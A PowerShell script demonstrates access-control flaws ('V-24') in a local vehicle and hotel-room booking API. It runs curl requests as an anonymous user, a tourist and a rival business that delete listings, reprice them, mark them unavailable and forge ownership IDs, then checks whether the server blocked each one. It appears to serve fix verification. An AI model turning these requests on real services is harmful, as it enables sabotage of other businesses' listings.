# V-24 attack demonstration - public management endpoints.
#
#   powershell -ExecutionPolicy Bypass -File scripts\v24Attack.ps1
#
# Two competing businesses, Alpha and Beta, each owning a vehicle and a hotel
# room. The demo shows an anonymous attacker and then Beta sabotaging Alpha's
# listings. Uses curl.exe so status codes are reported exactly as sent.

$API = "http://localhost:4000"
$tmp = [System.IO.Path]::GetTempFileName()

function Status($method, $url, $auth, $body) {
    $a = @("-s","-o","NUL","-w","%{http_code}","-X",$method,$url)
    if ($auth) { $a += @("-H","Authorization: Bearer $auth") }
    if ($body) {
        [System.IO.File]::WriteAllText($tmp, $body)
        $a += @("-H","Content-Type: application/json","-d","@$tmp")
    }
    return (curl.exe @a)
}
function Show($code, $meansAttackWorked) {
    if ($code -match '^2') {
        Write-Host ">>> HTTP status: $code   <-- $meansAttackWorked" -ForegroundColor Red
    } else {
        Write-Host ">>> HTTP status: $code   <-- BLOCKED BY SERVER" -ForegroundColor Green
    }
}
function Field($name, $value, $original) {
    if ($value -eq $original) {
        Write-Host "      $name = $value   (unchanged)" -ForegroundColor Green
    } else {
        Write-Host "      $name = $value   <-- was $original" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "Setting up two competing businesses (Alpha and Beta)..."
$setup = node scripts/v24SetupFixtures.js
$p = $setup -split "\|"
if ($p.Count -lt 9) { Write-Host "Setup failed:" -ForegroundColor Yellow; Write-Host $setup; exit 1 }

$alphaToken = $p[0]; $alphaVehicle = $p[1]; $alphaRoom = $p[2]
$betaToken  = $p[3]; $betaVehicle  = $p[4]; $betaRoom  = $p[5]
$touristToken = $p[6]; $alphaB = $p[7]; $betaB = $p[8]

Write-Host "  Alpha vehicle: $alphaVehicle  (price 5000/day)"
Write-Host "  Beta  vehicle: $betaVehicle"

# ---------------------------------------------------------------- ATTACK 1
Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 1 - Anonymous user deletes a business's vehicle  #"
Write-Host "############################################################"
Write-Host ""
Write-Host "(Anonymous access was already closed by the V-13 fix, so this is"
Write-Host " expected to be blocked in BOTH runs. Attacks 3-5 are the V-24 ones.)"
Write-Host ""
Write-Host "No login. No token. Just the vehicle id:"
Write-Host ""
Write-Host "`$ curl -X DELETE $API/api/vehicle/$alphaVehicle"
Write-Host ""
Show (Status "DELETE" "$API/api/vehicle/$alphaVehicle" $null $null) "VEHICLE DELETED BY A STRANGER"

# ---------------------------------------------------------------- ATTACK 2
Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 2 - Anonymous user rewrites a hotel room price   #"
Write-Host "############################################################"
Write-Host ""
Write-Host "(Also closed by V-13 - blocked in both runs.)"
Write-Host ""
$roomBody = '{"name":"HACKED ROOM","price_day":1,"price_month":1,"quantity":9999}'
Write-Host "`$ curl -X PUT $API/api/hotelroom/$alphaRoom \"
Write-Host "    -d '{""name"":""HACKED ROOM"",""price_day"":1,""quantity"":9999}'"
Write-Host ""
Show (Status "PUT" "$API/api/hotelroom/$alphaRoom" $null $roomBody) "ROOM REPRICED BY A STRANGER"

# ---------------------------------------------------------------- ATTACK 3
Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 3 - Tourist account manages business inventory   #"
Write-Host "############################################################"
Write-Host ""
Write-Host "*** THIS IS A V-24 ATTACK ***" -ForegroundColor Cyan
Write-Host ""
Write-Host "A logged-in tourist has no business, but tries anyway:"
Write-Host ""
Write-Host "`$ curl -X DELETE $API/api/vehicle/$betaVehicle -H `"Authorization: Bearer <TOURIST>`""
Write-Host ""
Show (Status "DELETE" "$API/api/vehicle/$betaVehicle" $touristToken $null) "TOURIST DELETED BUSINESS INVENTORY"

# ---------------------------------------------------------------- ATTACK 4
Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 4 - Beta sabotages its competitor Alpha          #"
Write-Host "############################################################"
Write-Host ""
Write-Host "*** THIS IS A V-24 ATTACK ***" -ForegroundColor Cyan
Write-Host ""
Write-Host "Beta is a legitimate logged-in business - but not Alpha's owner."
Write-Host "It undercuts Alpha's price and marks the car unavailable:"
Write-Host ""
$sabotage = '{"modelName":"OUT OF SERVICE","priceDay":1,"status":"Unavailable","B_Id":"' + $betaB + '"}'
Write-Host "`$ curl -X PUT $API/api/vehicle/$alphaVehicle -H `"Authorization: Bearer <BETA>`" \"
Write-Host "    -d '{""modelName"":""OUT OF SERVICE"",""priceDay"":1,"
Write-Host "         ""status"":""Unavailable"",""B_Id"":""<BETA'S OWN ID>""}'"
Write-Host ""
$code4 = Status "PUT" "$API/api/vehicle/$alphaVehicle" $betaToken $sabotage
Write-Host "    server replied: HTTP $code4"
Write-Host ""

# Read the record back to show what really happened.
$check = node scripts/v24CheckVehicle.js $alphaVehicle
$c = $check -split "\|"
Write-Host "    Alpha's vehicle in the database now:"
if ($c[0] -eq 'MISSING') {
    Write-Host "      DELETED" -ForegroundColor Red
} else {
    Field "modelName" $c[0] "Alpha Toyota Axio"
    Field "priceDay " $c[1] "5000"
    Field "status   " $c[2] "Available"
    Field "B_Id     " $c[3] $alphaB
}
Write-Host ""
if ($c[0] -eq 'Alpha Toyota Axio' -and $c[1] -eq '5000') {
    Write-Host ">>> BLOCKED - Alpha's listing is intact" -ForegroundColor Green
} else {
    Write-Host ">>> SABOTAGE SUCCEEDED - Alpha's listing was altered by a competitor" -ForegroundColor Red
}

# ---------------------------------------------------------------- ATTACK 5
Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 5 - Creating inventory under another business    #"
Write-Host "############################################################"
Write-Host ""
Write-Host "*** THIS IS A V-24 ATTACK ***" -ForegroundColor Cyan
Write-Host ""
Write-Host "Beta creates a room but forges Alpha's B_Id so the listing"
Write-Host "appears under Alpha's business:"
Write-Host ""
Write-Host "`$ curl -X POST $API/api/hotelroom -H `"Authorization: Bearer <BETA>`" \"
Write-Host "    -F ""B_Id=<ALPHA'S ID>"" -F ""name=Planted Room"" ..."
Write-Host ""
$a = @("-s","-o","NUL","-w","%{http_code}","-X","POST","$API/api/hotelroom",
       "-H","Authorization: Bearer $betaToken",
       "-F","B_Id=$alphaB","-F","name=$TAG Planted Room","-F","description=planted",
       "-F","quantity=1","-F","availability=Available","-F","price_day=1",
       "-F","price_month=1","-F","bed=1","-F","max_occupancy=1",
       "-F","userId=forged","-F","image=@scripts/v24pixel.png")
$code5 = (curl.exe @a)
Write-Host "    server replied: HTTP $code5"
$planted = node scripts/v24CheckPlanted.js $alphaB
Write-Host ""
if ($planted -match '^PLANTED') {
    Write-Host "      A room now exists under Alpha's B_Id, created by Beta" -ForegroundColor Red
    Write-Host ">>> FORGED OWNERSHIP ACCEPTED" -ForegroundColor Red
} elseif ($code5 -match '^2') {
    Write-Host "      Room was created, but under Beta's own B_Id (forged value ignored)" -ForegroundColor Green
    Write-Host ">>> FORGED OWNERSHIP IGNORED - server used the token identity" -ForegroundColor Green
} else {
    Write-Host ">>> BLOCKED BY SERVER (HTTP $code5)" -ForegroundColor Green
}

Write-Host ""
node scripts/v24SetupFixtures.js --cleanup | Out-Null
Write-Host "(demo accounts removed)" -ForegroundColor DarkGray
Remove-Item $tmp -ErrorAction SilentlyContinue
Write-Host ""
